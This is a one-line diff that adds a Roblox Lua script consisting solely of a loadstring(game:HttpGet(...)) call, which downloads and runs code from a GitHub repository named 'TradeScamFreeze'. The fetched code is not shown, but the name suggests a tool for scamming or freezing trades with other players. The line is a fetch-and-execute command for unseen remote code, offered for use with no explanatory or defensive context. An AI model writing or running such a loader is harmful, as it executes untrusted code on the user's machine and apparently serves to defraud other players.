@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/darkpgez/TradeScamFreeze/refs/heads/main/TradeFreeze',true))()
